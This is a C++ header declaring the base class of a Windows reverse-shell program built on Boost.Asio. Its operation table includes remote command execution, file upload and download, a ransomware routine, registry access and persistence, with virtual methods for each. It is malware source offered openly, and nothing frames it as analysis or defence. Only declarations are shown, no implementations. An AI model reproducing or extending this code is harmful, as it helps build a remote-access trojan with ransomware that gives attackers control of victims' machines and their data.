#pragma once

#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <boost/asio.hpp>
#include <fstream>
#include <filesystem>

class ReverseShellStandard 
{
	using IoService = boost::asio::io_service;
	#define DEFAULT_BUFFER_SIZE 1024

protected:
	enum OperationType { RUN_COMMAND = 1, DOWNLOAD_FILE, UPLOAD_FILE, RANSOMWARE, REGISTRY_OPERATION, PERSISTENCE, INVALID };

	ReverseShellStandard();
	~ReverseShellStandard();
	void OpenFileFor(const std::string& filePath, int mode);
	size_t Send(const OperationType& operationType);
	size_t Send(int numberToSend);
	size_t Send(const std::string& message);
	size_t Send(const boost::asio::mutable_buffer& t_buffer);
	std::string Response();
	OperationType GetOperationType(const std::string& operation);
	void UploadFile(const std::string& localFilePath);
	void DownloadFile(const std::string& filePath);
	virtual void Connect() = 0;
	virtual OperationType ReadOperationType() = 0;
	virtual void RunCommand() = 0;
	virtual void DownloadFile() = 0;
	virtual void UploadFile() = 0;
	virtual void RunRansomware() = 0;
	virtual void AccessRegistry() = 0;
	virtual void CreatePersistence() = 0;
	virtual void InvalidOperation() = 0;

private:
	std::string CleanReponse(size_t responseSize);
	void UploadFileBytes(size_t fileSize);
	void BytesFromFileToBuffer(std::array<char, DEFAULT_BUFFER_SIZE>& response);
	void BytesFromSocketToFile(int amountOfBytes);
	void WriteLeakedBytes();

protected:
	IoService m_ioService;
	boost::asio::ip::tcp::socket m_socket;
	boost::asio::streambuf m_responseBuf;
	const std::string m_delimiter = "#\r\n$\r\n#";
	std::fstream m_file;
	std::unordered_map<std::string, OperationType> m_operations
	{
		{"1", RUN_COMMAND},
		{"2", DOWNLOAD_FILE},
		{"3", UPLOAD_FILE},
		{"4", RANSOMWARE},
		{"5", REGISTRY_OPERATION},
		{"6", PERSISTENCE}
	};

public:
	boost::system::error_code m_errorCode;
};